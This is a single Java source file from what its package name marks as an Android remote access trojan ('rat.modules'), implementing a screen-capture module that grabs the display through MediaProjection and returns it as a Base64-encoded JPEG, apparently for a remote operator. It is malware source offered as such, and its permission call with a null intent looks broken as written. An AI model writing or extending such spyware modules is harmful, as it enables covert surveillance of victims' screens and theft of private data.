package com.xroomjx.rat.modules;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenCapture {
    public static String capture(Context context) {
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            // Note: requires user consent on first run
            MediaProjection projection = mpm.getMediaProjection(0, null);
            if (projection == null) return "no_permission";

            int width = 1080, height = 1920, density = 240;
            ImageReader reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            VirtualDisplay display = projection.createVirtualDisplay(
                "screen", width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.getSurface(), null, null);

            Thread.sleep(500);
            Image image = reader.acquireLatestImage();
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * width;

                Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                image.close();
                display.release();
                projection.stop();
                return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
            }
            display.release();
            projection.stop();
            return "capture_failed";
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }
}
